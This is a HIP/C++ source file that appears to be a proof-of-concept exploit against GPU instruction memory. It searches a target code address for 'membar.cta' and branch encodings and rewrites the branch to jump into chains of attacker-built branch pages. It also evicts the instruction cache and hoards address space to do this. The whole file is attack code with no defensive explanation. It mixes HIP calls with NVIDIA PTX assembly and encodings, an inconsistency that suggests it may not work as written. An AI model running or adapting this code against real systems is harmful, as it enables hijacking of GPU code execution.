#include <hip/hip_runtime.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#define CHUNK0_SIZE (64L * 1024L * 1024L * 1024L * 1024L + 0x55554000000L)
#define CHUNK1_SIZE (41L * 1024L * 1024L * 1024L * 1024L + 0x0ffc8000000L)
#define STRIDE_SIZE (1L * 1024L * 1024L)

#define BASE_ADDR   0x700000000000
#define DUMMY_ADDR  0x7F0000000000

#define PAGE0_NUM   16
#define PAGE1_NUM   4000
#define WAIT_TIME   1000000000L // about 0.5 seconds on RTX3080

#define BLK_NUM     100
#define SHARED_MEM  (96 * 1024)
#define SMID0       0
#define SMID1       1 // IMPORTANT: SM0 and SM1 are in the same TPC

#define INST1       "membar.cta;"
#define INST2       INST1 INST1
#define INST4       INST2 INST2
#define INST8       INST4 INST4
#define INST16      INST8 INST8
#define INST32      INST16 INST16
#define INST64      INST32 INST32
#define INST128     INST64 INST64
#define INST256     INST128 INST128
#define INST512     INST256 INST256
#define INST1K      INST512 INST512
#define INST2K      INST1K INST1K
#define INST4K      INST2K INST2K
#define INST8K      INST4K INST4K

__device__ void 
branch(uint64_t src, uint64_t dst, uint64_t *ptr0, uint64_t *ptr1)
{
  int64_t off = 0;
  uint64_t lo = 0;
  uint64_t hi = 0;
  
  src += 16;
  off = dst - src;
  lo = (off & 0x00000000FFFFFFFF) << 32;
  hi = (off >> 32) & 0x000000000003FFFF;
  
  *ptr0 = 0x0000000000007947 | lo;
  *ptr1 = 0x003FDE0003800000 | hi;
}

__global__ void 
loop(uint64_t *head, uint64_t *tail, volatile uint64_t *page1, uint64_t addr, uint64_t x)
{
  int i = 0;
  uint64_t y = x;
  volatile uint64_t *ptr = NULL;
  uint64_t bra_lo = 0;
  uint64_t bra_hi = 0;
  uint64_t clk0 = 0;
  uint64_t clk1 = 0;
  uint32_t smid;
  
  asm("mov.u32 %0, %%smid;" : "=r" (smid));
  if (smid != SMID0 && smid != SMID1)
    return;
  
  if (smid == SMID0) {
    for (i = 0; i < (2 * 1024 * 1024 / 8); i += 2) {
      // find "membar.cta;"
      y = *((uint64_t *)addr + i);
      if (y != 0x0000000000007992)
        continue;
      // find "bra l0;"
      y = *((uint64_t *)addr + i + 2);
      if (y != 0x0000000000007947)
        continue;
      y = *((uint64_t *)addr + i + 3);
      if ((y & 0x000000000FFFFFFF) == 0x0000000003800000) {
        ptr = (uint64_t *)addr + i + 2;
        break;
      }
    }
    
    if (ptr != NULL) {
      branch((uint64_t)ptr, (uint64_t)head, &bra_lo, &bra_hi);
      ptr[0] = bra_lo;
      ptr[1] = bra_hi;
      branch((uint64_t)tail, (uint64_t)(ptr + 2), &bra_lo, &bra_hi);
      tail[0] = bra_lo;
      tail[1] = bra_hi;
    }
    
    // use INST8K to evict L1 instruction cache!!!
    asm volatile(
      INST8K
      "l0:"
      "bra l1;"
      "l1:"
    );
    
    clk0 = clock64();
    clk1 = 0;
    while (clk1 < WAIT_TIME)
      clk1 = clock64() - clk0;
    
    asm volatile("bra l0;");
    
  } else if (smid == SMID1) {
    while (y == x) {
      for (ptr = (uint64_t *)page1[0]; ptr != page1; ptr = (uint64_t *)ptr[0])
        ++ptr[2];
      
      y = ptr[1];
    }
  }
  
  page1[1] = 0;
}

__global__ void
put(uint64_t *page, uint64_t x1, uint64_t x2)
{
  page[0] = x1;
  page[1] = x2;
}

__global__ void
link(uint64_t *page_from, uint64_t *page_to)
{
  uint64_t bra_lo = 0;
  uint64_t bra_hi = 0;
  
  branch((uint64_t)page_from, (uint64_t)page_to, &bra_lo, &bra_hi);
  page_from[0] = bra_lo;
  page_from[1] = bra_hi;
}

int 
main(int argc, char *argv[])
{
  uint8_t *chunk0 = NULL;
  uint8_t *chunk1 = NULL;
  uint8_t *base = NULL;
  uint64_t *list0[PAGE0_NUM];
  uint64_t *list1[PAGE1_NUM];
  uint64_t *dummy = NULL;
  uint64_t addr = 0;
    
  hipDeviceReset();
  hipFuncSetAttribute(reinterpret_cast<const void*>(loop), hipFuncAttributeMaxDynamicSharedMemorySize, SHARED_MEM);

  // hoard a large address space
  hipMallocManaged(&chunk0, CHUNK0_SIZE);
  hipMallocManaged(&chunk1, CHUNK1_SIZE);
  
  base = (uint8_t *)BASE_ADDR;
  for (int i = 0; i < PAGE0_NUM; ++i)
    list0[i] = (uint64_t *)(base + i * STRIDE_SIZE);
  base += PAGE0_NUM * STRIDE_SIZE;
  for (int i = 0; i < PAGE1_NUM; ++i)
    list1[i] = (uint64_t *)(base + i * STRIDE_SIZE);
  dummy = (uint64_t *)DUMMY_ADDR;
  
  for (int i = 0; i < PAGE0_NUM - 1; ++i)
    link<<<1, 1>>>(list0[i], list0[i + 1]);
  for (int i = 0; i < PAGE1_NUM; ++i)
    put<<<1, 1>>>(list1[i], (uint64_t)list1[(i + 1) % PAGE1_NUM], 0xdeadbeef);
  put<<<1, 1>>>(dummy, 0, 0);
  hipDeviceSynchronize();  
  
  addr = strtoull(argv[1], NULL, 16);
  
  loop<<<BLK_NUM, 1, SHARED_MEM>>>(list0[0], list0[PAGE0_NUM - 1], list1[0], addr, 0xdeadbeef);
  hipDeviceSynchronize();
  
  hipFree(chunk0);
  hipFree(chunk1);
}

